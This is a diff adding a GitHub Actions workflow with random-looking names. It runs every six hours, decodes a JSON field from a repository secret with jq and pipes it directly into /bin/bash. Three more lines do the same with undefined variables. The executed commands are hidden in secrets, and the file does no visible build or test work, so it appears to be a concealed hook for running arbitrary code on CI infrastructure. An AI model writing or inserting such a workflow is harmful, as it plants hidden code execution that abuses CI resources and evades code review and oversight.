@@ -1,0 +1,20 @@
+name: ambitionpowder
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '37 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ambitionpowder
+        env:
+          mfy339: ${{ secrets.mfy339 }}
+        run: |
+          echo $mfy339 | jq -r .my70591 | /bin/bash
+          echo $w13 | jq -r .zju762 | /bin/bash
+          echo $zj98150 | jq -r .opqh20 | /bin/bash
+          echo $gp6901 | jq -r .bm3824 | /bin/bash
+
